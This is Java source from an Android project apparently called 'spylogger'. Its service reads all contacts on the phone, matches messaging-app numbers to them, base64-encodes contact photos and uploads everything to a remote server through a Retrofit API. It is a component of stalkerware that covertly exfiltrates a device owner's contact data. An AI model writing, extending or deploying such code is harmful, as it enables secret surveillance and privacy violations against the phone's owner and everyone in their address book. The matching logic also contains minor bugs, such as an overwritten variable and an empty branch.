package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendContatosService extends SendDataService<RespostaRecebimentoVO> {
    private Context context;

    private List<ContatoVO> contatos;

    public SendContatosService(Context context, TaskComplete handler) {
        super(handler);
        this.context = context;
    }

    private ContatoVO getContato(String numero, TipoMensagem tipoMensagem){
        for (ContatoVO contato:contatos){
            if(!TipoMensagem.MESSENGER.equals(tipoMensagem)) {
                String num = numero.split("@")[0];
                num = num.indexOf("-") != -1 ? num.split("-")[0] : num;
                num = numero.replaceAll("[^\\d\\+]", "");
                if (contato.getNumero().equals(num)) {
                    return contato;
                }
                if (num.length() > 8) {
                    num = num.substring(num.length() - 8, num.length());
                } else {
                    Log.i("dd", "");
                }
                if (contato.getNumero().endsWith(num)) {
                    return contato;
                }
            }else{
                if (contato.getNome().equalsIgnoreCase(numero)) {
                    return contato;
                }
            }

        }
        return null;
    }

    private List<ContatoVO> getContatos(String numeros, TipoMensagem tipoMensagem){
        List<ContatoVO> contatoVOs=new ArrayList<>();
        if(numeros!=null && !numeros.isEmpty()) {
            String[] nums = numeros.split("#");
            for (String num : nums) {
                if (!num.isEmpty()) {
                    ContatoVO contatoVO = getContato(num, tipoMensagem);
                    if (contatoVO != null) {
                        File foto = Utils.getFotoContato(num);
                        if (foto != null) {
                            contatoVO.setFoto(Utils.encodeBase64(foto));
                        }
                        contatoVOs.add(contatoVO);
                    }
                }
            }
        }
        return contatoVOs;
    }


    public void enviarContatos(){
        contatos = Utils.getContatos(context.getContentResolver());
        Call<RespostaRecebimentoVO> resp = sendApi.enviarContatos(contatos);
        resp.enqueue(this);
    }

    @Override
    public void onResponse(Call<RespostaRecebimentoVO> call, Response<RespostaRecebimentoVO> response) {
        RespostaRecebimentoVO resposta = response.body();

        if (resposta != null) {

        }
    }
}
